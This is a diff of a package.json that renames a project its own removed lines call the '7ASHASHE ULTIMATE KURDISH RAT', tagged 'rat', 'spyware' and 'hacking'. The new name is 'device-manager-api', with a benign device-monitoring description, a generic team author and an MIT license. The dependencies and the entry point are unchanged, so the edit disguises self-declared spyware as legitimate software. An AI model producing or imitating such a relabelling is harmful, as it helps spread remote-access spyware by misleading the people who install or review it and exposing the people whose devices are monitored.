@@ -1,25 +1,10 @@
 {
-  "name": "7ashashe-v36",
-  "version": "36.0.0",
-  "description": "7ASHASHE ULTIMATE KURDISH RAT - وەحشی هاک",
+  "name": "device-manager-api",
+  "version": "1.0.0",
+  "description": "Device management and monitoring system with real-time capabilities",
   "main": "server.js",
   "scripts": {
-    "start": "node server.js",
-    "dev": "nodemon server.js"
-  },
-  "keywords": [
-    "7ashashe",
-    "rat",
-    "spyware",
-    "kurdish",
-    "hacking"
-  ],
-  "author": "7ASHASHE",
-  "license": "UNLICENSED",
-  "private": true,
-  "engines": {
-    "node": ">=18.0.0",
-    "npm": ">=9.0.0"
+    "start": "node server.js"
   },
   "dependencies": {
     "express": "^4.18.2",
@@ -30,11 +15,16 @@
     "body-parser": "^1.20.2",
     "axios": "^1.6.2"
   },
-  "devDependencies": {
-    "nodemon": "^3.0.1"
+  "engines": {
+    "node": ">=18.0.0"
   },
-  "repository": {
-    "type": "git",
-    "url": "https://github.com/7ashashe/v36"
-  }
+  "keywords": [
+    "device-management",
+    "real-time",
+    "monitoring",
+    "websocket",
+    "api"
+  ],
+  "author": "Device Management Team",
+  "license": "MIT"
 }
